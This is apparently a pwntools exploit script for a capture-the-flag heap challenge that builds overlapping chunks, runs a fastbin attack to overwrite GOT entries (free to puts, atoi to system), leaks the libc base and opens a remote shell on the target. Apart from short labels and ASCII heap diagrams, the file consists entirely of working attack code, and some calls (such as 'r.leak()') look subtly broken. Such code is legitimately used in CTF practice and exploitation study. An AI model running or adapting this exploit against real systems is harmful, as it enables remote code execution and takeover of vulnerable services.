#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
prog = os.path.dirname(os.path.abspath(__file__)).split('/')[-1]
if not os.path.exists(prog):
    log.warning('{}: No such file or directory'.format(prog))
else:
    elf = ELF(prog); context.word_size = elf.elfclass
    with context.local(log_level='ERROR'):
        libc = ELF('libc.so.6') if len(sys.argv) > 2 else elf.libc
    if not libc: log.warning('Cannot open libc.so.6')

def add(size, name, secret, len=0x100):
    r.sendlineafter('choice :', '1')
    r.sendlineafter('heart : ', str(size))
    r.recvuntil('heart :')
    r.sendline(name, len)
    r.recvuntil('heart :')
    r.sendline(secret, len)

def show(idx):
    r.sendlineafter('choice :', '2')
    r.sendlineafter('Index :', str(idx))
    r.recvuntil('Name : ')
    leak_name = r.recvline()
    r.recvuntil('Secret : ')
    leak_secert = r.recvline()

def delete(idx):
    r.sendlineafter('choice :', '3')
    r.sendlineafter('Index :', str(idx))

r = remote(HOST, PORT)

# graph is stolen from :
# https://david942j.blogspot.tw/2016/12/write-up-whitehat-grand-prix-2016_21.html

# overlap chunk
"""
+---------+---------+---------+---------+---------------+---+---------+-----------+
| 0: 0x91 | 1: 0x71 | 2: 0x31 | 3: 0x41 |   4: 0x111    |   | 5: 0x41 | top_chunk |
+---------+---------+---------+---------+---------------+---+---------+-----------+
                                                          ^ fake meta
"""
size1=0x60
size2=0x20
size3=0x40
add(0x80,  '0', '')
add(size1-0x10,  '1', '')
add(size2-0x10,  '2', '')
add(size3-0x10,  '3', '')
fake_meta = p64(0) + p64(size3+0x10+1)
add(0x100, '4', ''.ljust(0xf0, '\x00') + fake_meta)
add(size3-0x10,  '5', '')

"""
|------------------------ 0x250 -------------------------|
+---------+---------+---------+---------+----------------+---+---------+-----------+
| 0: 0x91 | 1: 0x71 | 2: 0x31 | 3: 0x40 | 4: 0x100(fake) |   | 5: 0x41 | top_chunk |
+---------+---------+---------+---------+----------------+---+---------+-----------+
|  freed  |                   |  freed  | prev_size(0xe0)| ^ fake meta
+---------+                   +---------+----------------+
"""
delete(0)
delete(3)
prev_size = p64(0x90+size1+size2+size3)
add(size3-8, '3', ''.ljust(size3-0x10)+prev_size, size3-8)

"""
+---------+---------+------------------------------------+---+---------+-----------+
|                         0x251                          |   | 3: 0x41 | top_chunk |
+---------+---------+---------+---------+----------------+---+---------+-----------+
 overlap! | 1: 0x70 | 2: 0x30 | 3: 0x40 |                  ^ fake meta
          +---------+---------+---------+
"""
delete(4)

# fastbin attack
chunk_0x30 = flat(0, size1, 0x601ffa).ljust(size1, '\x00')
chunk_0x40 = flat(0, size3, 0x602022).ljust(size3, '\x00')
delete(0)
delete(1)

# overwrite got.free to puts
add(0x70, '0', 'padding')
add(0x60, '1', chunk_0x30)
add(size1-0x10, '3', '')
add(size1-0x10, '4', 'a'*14 + p64(elf.sym['puts'])[:6])

# leak libc_base
delete(2)
#libc_base = r.leak() - 0x3c4c58
libc_base = r.leak() - 0x3c3b78
libc.address += libc_base
log.info('libc_base: ' + hex(libc_base))

# overwrite got.atoi to system
add(0x100, '2', '\x00'*0x10 + chunk_0x40)
add(size3-0x10, '6', '')
got = flat(
    'a'*6, libc.sym['printf'], libc.sym['system'], libc.sym['read'],
)
add(size3-0x10, '7', got)

# shell out
add(123, '/bin/sh', '')
delete(8)

r.interactive()
